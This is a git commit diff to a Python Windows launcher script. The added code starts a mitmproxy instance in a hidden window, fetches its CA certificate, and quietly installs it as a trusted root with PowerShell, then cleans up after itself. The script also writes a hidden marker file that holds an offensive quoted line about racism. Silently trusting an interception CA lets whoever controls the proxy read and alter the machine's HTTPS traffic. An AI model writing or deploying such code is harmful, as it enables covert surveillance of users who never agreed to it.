2a53997707b8be4f71e253c6bf92efd4ba789206
afont1 <afont@student.42nice.fr>
2024-12-14 14:00:43 +0100

    auto install certificate

--- launcher.py
+++ launcher.py
@@ -2,15 +2,58 @@ import subprocess
 import os
 import sys
 import ctypes
+import threading
+import psutil
+import winreg
 
 FILE_ATTRIBUTE_HIDDEN = 0x02
 CHECK_FILE_PATH = 'C:\\bilgeDiff.txt'
+INTERNET_SETTINGS = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings', 0, winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE)
+
+def disable_proxy():
+	try:
+		_, reg_type = winreg.QueryValueEx(INTERNET_SETTINGS, 'ProxyEnable')
+	except FileNotFoundError:
+		reg_type = winreg.REG_DWORD
+	winreg.SetValueEx(INTERNET_SETTINGS, 'ProxyEnable', 0, reg_type, 0)
 
 def is_admin():
 	try:
 		return ctypes.windll.shell32.IsUserAnAdmin()
 	except:
 		return False
+	
+def download_file():
+	thread = threading.Thread(target=launch_mitm_dl)
+	thread.start()
+
+	import requests
+	proxies = {
+		'http': 'http://127.0.0.1:20000',
+		'https': 'http://127.0.0.1:20000',
+	}
+	cert_url = 'http://mitm.it/cert/cer'
+	cert_path = os.path.join(os.path.dirname(os.path.abspath(sys.executable)), 'mitmproxy-ca-cert.cer')
+	response = requests.get(cert_url, proxies=proxies)
+	with open(cert_path, 'wb') as f:
+		f.write(response.content)
+	
+	on_quit(thread)
+
+def install_certificate():
+	cert_path = os.path.join(os.path.dirname(os.path.abspath(sys.executable)), 'mitmproxy-ca-cert.cer')
+	print(f"Certificat path: {cert_path}")
+	if not os.path.exists(cert_path):
+		print(f"Le fichier {cert_path} n'existe pas.")
+		return
+	try:
+		subprocess.run([
+			'powershell.exe',
+			f'Import-Certificate -FilePath "{cert_path}" -CertStoreLocation cert:\\LocalMachine\\Root'
+		], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+		os.remove(cert_path)
+	except subprocess.CalledProcessError as e:
+		print(f"Erreur lors de l'installation du certificat: {e}")
 
 def install_packages():
 	install_commands = '''
@@ -21,7 +64,6 @@ def install_packages():
 	choco install -y python3;
 	$env:PATH = [System.Environment]::GetEnvironmentVariable("PATH", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("PATH", "User");
 	pip install mitmproxy pystray Pillow requests psutil;
-	pause;
 	'''
 	try:
 		subprocess.run(['powershell', '-Command', install_commands], creationflags=subprocess.CREATE_NEW_CONSOLE)
@@ -29,11 +71,23 @@ def install_packages():
 		print(f"Error executing command: {e}")
 		print(f"Command output: {e.stdout}")
 		print(f"Command error: {e.stderr}")
+	
+	download_file()
+	install_certificate()
 
 	if not os.path.exists(CHECK_FILE_PATH):
 		with open(CHECK_FILE_PATH, 'w') as f:
 			f.write('t\'imagine meme pas comment j\'suis raciste.\n	-Hyyven')
 		ctypes.windll.kernel32.SetFileAttributesW(CHECK_FILE_PATH, FILE_ATTRIBUTE_HIDDEN)
+	
+def on_quit(thread):
+	disable_proxy()
+	for proc in psutil.process_iter(['pid', 'name']):
+		if proc.info['name'] == 'mitmdump.exe':
+			proc.terminate()
+			break
+	if threading.current_thread() != thread:
+		thread.join()
 
 def resource_path(relative_path):
 	try:
@@ -41,6 +95,21 @@ def resource_path(relative_path):
 	except Exception:
 		base_path = os.path.abspath(".")
 	return os.path.join(base_path, relative_path)
+
+def launch_mitm_dl():
+	command = [
+		'mitmdump',
+		'--quiet',
+		'-p', '20000',
+	]
+	try:
+		subprocess.run(command, creationflags=subprocess.CREATE_NO_WINDOW)
+		# subprocess.run(command)
+	except subprocess.CalledProcessError as e:
+		print(f"Error executing command: {e}")
+		print(f"Command output: {e.stdout}")
+		print(f"Command error: {e.stderr}")
+		
 
 def launch_mitm():
 	mitm_script = resource_path('mitm.py')
@@ -67,5 +136,5 @@ if __name__ == "__main__":
 			sys.exit()
 		install_packages()
 	else:
-		if not is_admin():
+		if os.path.exists(CHECK_FILE_PATH) and not is_admin():
 			launch_mitm()
